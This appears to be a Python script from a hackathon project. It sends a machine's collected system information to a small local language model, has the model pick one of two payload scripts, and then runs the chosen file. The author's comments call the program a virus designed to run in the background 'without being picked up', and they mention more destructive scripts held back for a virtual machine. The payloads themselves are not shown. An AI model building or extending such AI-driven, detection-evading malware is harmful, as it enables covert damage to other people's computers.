import subprocess
import runLlama
import run_cmd
import os

def main():
    csv_file_path = 'W:/hakathon2024/getInfoScripts/system_info.csv'  
    user_question = "Based on this information, can you choose one file : SunityAsset2.py or unityAsset3.py? Just give me the file name when you choose, nothing else. The format is very important, make sure there's nothing in front or behind, just the filename and .py . that's it."
    #the model can't give the other scripts because i don't want to actually kill someone's pc. Final version is meant to be ran on a virtual machine and nothing less.
    # Get the response from the model
    response = runLlama.generate_response_with_dynamic_csv(csv_file_path, user_question)
    
#The whole functionality is just three files - it used to be way , way more. I've made it as small as possible, 
#and used the smallest ai model i can find, so that this can effectively run in the background without being picked up.
#It's meant to be a virus, after all, the shorter the better. 
#aka im sorry for the compact code, and good luck reading :)
   
    print(f"Model chose file: {response}")
    
    if response:  # If the model responded with a valid filename
        # Step 3: Run the command in run_cmd.py with the chosen file
        vimeows_folder = "W:/hakathon2024/modelScripts/vimeows/" + response  
        # responsePath = os.path.join(vimeows_folder, runFile)  # Full path to the chosen file
        
        if os.path.isfile(vimeows_folder):
            print(f"Running the file: {vimeows_folder}")
            run_cmd.run_command(f"python {vimeows_folder}")
        else:
            print(f"Error: The file {vimeows_folder} does not exist.")
    else:
        print("Error: No valid file name returned from the model.")

if __name__ == "__main__":
    main()
